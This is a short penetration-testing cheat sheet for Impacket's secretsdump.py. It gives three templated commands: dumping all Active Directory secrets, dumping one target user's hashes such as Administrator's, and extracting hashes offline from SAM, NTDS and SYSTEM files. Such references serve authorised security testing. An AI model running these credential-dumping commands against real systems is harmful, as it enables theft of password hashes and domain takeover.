# secretsdump
#target/remote #os/linux #cat/ad

## Dump all secrets
```
secretsdump.py <domain>/'<user>'<impacket_target_auth>
```

## Dump target user
```
secretsdump.py <domain>/'<user>'<impacket_target_auth> -just-dc-user <target_user|Administrator>
```

## Dump local
```
secretsdump.py LOCAL -sam <sam|SAM> -ntds <ntds|NTDS> -system <system|SYSTEM>
```
